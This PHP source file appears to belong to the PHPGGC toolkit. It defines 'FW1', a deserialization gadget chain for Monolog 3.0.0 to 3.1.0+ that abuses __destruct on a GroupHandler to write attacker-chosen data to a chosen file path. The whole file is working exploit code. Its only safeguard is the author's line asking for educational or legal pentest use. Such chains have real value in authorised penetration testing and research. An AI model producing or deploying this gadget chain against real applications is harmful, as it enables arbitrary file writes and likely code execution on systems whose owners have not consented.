<?php

namespace GadgetChain\Monolog;

class FW1 extends \PHPGGC\GadgetChain\FileWrite
{
    public static $version = '3.0.0 <= 3.1.0+';
    public static $vector = '__destruct';
    public static $author = 'mir-hossein (Mirhossein Rahmani)';
    public static $information = 'Please use this GC only for educational purposes or legal pentest, Thank you!';

    public function generate(array $parameters)
    {
        $path = $parameters['remote_path'];
        $data = $parameters['data'];
        
        $data = preg_replace('/[\r\n]/', ' ', $data);  // Replaces "\r\n" with a space
        
        return new \Monolog\Handler\GroupHandler($data, $path);
    }
}